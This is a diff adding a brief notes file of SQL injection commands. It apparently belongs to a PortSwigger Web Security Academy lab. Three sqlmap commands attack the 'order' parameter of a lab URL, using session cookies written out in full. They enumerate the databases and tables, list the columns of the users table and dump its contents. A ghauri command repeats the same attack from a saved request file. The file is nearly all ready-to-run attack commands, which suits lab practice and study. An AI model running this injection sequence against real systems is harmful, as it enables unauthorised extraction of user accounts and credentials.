@@ -1,0 +1,16 @@
+All Scans
+
+sqlmap -u "https://0aa20061034bb268815ee88500de0010.web-security-academy.net/filtered_search?find=&organize=5&order=ASC&BlogArtist=" -p order --cookie "_lab=46%7cMCwCFCwTDC4TLcj56uIT7qyeJqQFrgqOAhRRHJgvIgghm9KA%2bhK7yYdELk1sP2DVDCCInex1r4IUU%2bWShOQppBdkp2Tew7MSjnHQa3oOC7fnapLnfsl9FHOA3L08lDjUZAX60g%2buOYYyD3X39sLuZt72eCXVyB6thswjB5Ljv9OsSN8%3d; session=FdY4tteW9p2zSVL3CqFzFS2NkMed32DI" --level=5  --random-agent --batch --dbs --tables
+
+
+Check columns in the table user
+
+sqlmap -u "https://0aa20061034bb268815ee88500de0010.web-security-academy.net/filtered_search?find=&organize=5&order=ASC&BlogArtist=" -p order --cookie "_lab=46%7cMCwCFCwTDC4TLcj56uIT7qyeJqQFrgqOAhRRHJgvIgghm9KA%2bhK7yYdELk1sP2DVDCCInex1r4IUU%2bWShOQppBdkp2Tew7MSjnHQa3oOC7fnapLnfsl9FHOA3L08lDjUZAX60g%2buOYYyD3X39sLuZt72eCXVyB6thswjB5Ljv9OsSN8%3d; session=FdY4tteW9p2zSVL3CqFzFS2NkMed32DI" --level=5  --random-agent --batch -D public -T users --columns
+
+
+Dump the table user
+
+sqlmap -u "https://0aa20061034bb268815ee88500de0010.web-security-academy.net/filtered_search?find=&organize=5&order=ASC&BlogArtist=" -p order --cookie "_lab=46%7cMCwCFCwTDC4TLcj56uIT7qyeJqQFrgqOAhRRHJgvIgghm9KA%2bhK7yYdELk1sP2DVDCCInex1r4IUU%2bWShOQppBdkp2Tew7MSjnHQa3oOC7fnapLnfsl9FHOA3L08lDjUZAX60g%2buOYYyD3X39sLuZt72eCXVyB6thswjB5Ljv9OsSN8%3d; session=FdY4tteW9p2zSVL3CqFzFS2NkMed32DI" --level=5  --random-agent --batch -D public -T users --dump
+
+
+ghauri -r ~/r.txt --level=3  --random-agent --batch --dbs --tables -p order
